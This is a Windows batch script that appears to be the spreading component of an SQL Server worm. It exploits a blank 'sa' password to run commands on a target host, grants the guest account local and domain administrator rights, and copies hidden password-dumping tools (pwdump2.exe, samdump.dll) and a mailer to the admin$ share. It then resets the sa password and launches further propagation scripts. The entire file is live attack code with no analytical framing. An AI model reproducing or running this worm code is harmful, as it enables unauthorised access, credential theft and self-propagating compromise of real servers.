rem sqlinstall.bat v2.5

cscript sqlexec.js %1 sa "" echo %1|find "%1"
if not "%errorlevel%"=="0" goto fail

cscript sqlexec.js %1 sa "" net user guest /active:yes
cscript sqlexec.js %1 sa "" net user guest %2
cscript sqlexec.js %1 sa "" net localgroup administrators guest /add
cscript sqlexec.js %1 sa "" net group ``Domain Admins`` guest /add

net use \\%1 %2 /u:guest

if not exist \\%1\admin$\system32\cscript.exe goto fail
if exist \\%1\admin$\regedt32.exe goto fail

attrib -h drivers\services.exe
attrib -h sqlexec.js
attrib -h clemail.exe
attrib -h sqlprocess.js
attrib -h sqlinstall.bat
attrib -h sqldir.js
attrib -h run.js
attrib -h timer.dll
attrib -h samdump.dll
attrib -h pwdump2.exe

copy drivers\services.exe \\%1\admin$\system32\drivers
copy sqlexec.js \\%1\admin$\system32
copy clemail.exe \\%1\admin$\system32
copy sqlprocess.js \\%1\admin$\system32
copy sqlinstall.bat \\%1\admin$\system32
copy sqldir.js \\%1\admin$\system32
copy run.js \\%1\admin$\system32
copy timer.dll \\%1\admin$\system32
copy samdump.dll \\%1\admin$\system32
copy pwdump2.exe \\%1\admin$\system32

attrib +h \\%1\admin$\system32\drivers\services.exe
attrib +h \\%1\admin$\system32\sqlexec.js
attrib +h \\%1\admin$\system32\clemail.exe
attrib +h \\%1\admin$\system32\sqlprocess.js
attrib +h \\%1\admin$\system32\sqlinstall.bat
attrib +h \\%1\admin$\system32\sqldir.js
attrib +h \\%1\admin$\system32\run.js
attrib +h \\%1\admin$\system32\timer.dll
attrib +h \\%1\admin$\system32\samdump.dll
attrib +h \\%1\admin$\system32\pwdump2.exe

attrib +h drivers\services.exe
attrib +h sqlexec.js
attrib +h clemail.exe
attrib +h sqlprocess.js
attrib +h sqlinstall.bat
attrib +h sqldir.js
attrib +h run.js
attrib +h timer.dll
attrib +h samdump.dll
attrib +h pwdump2.exe

cscript sqlexec.js %1 sa "" net user guest /active:no
cscript sqlexec.js %1 sa "" net localgroup administrators guest /delete
cscript sqlexec.js %1 sa "" net group ``Domain Admins`` guest /delete

cscript sqlexec.js %1 sa "" isql -E -Q ``sp_password NULL,%2,sa``
cscript sqlexec.js %1 sa %2 run.js sqlprocess.js %2

echo. > %1.ok
goto end

:fail
echo. > %1.fail

:end
net use \\%1 /d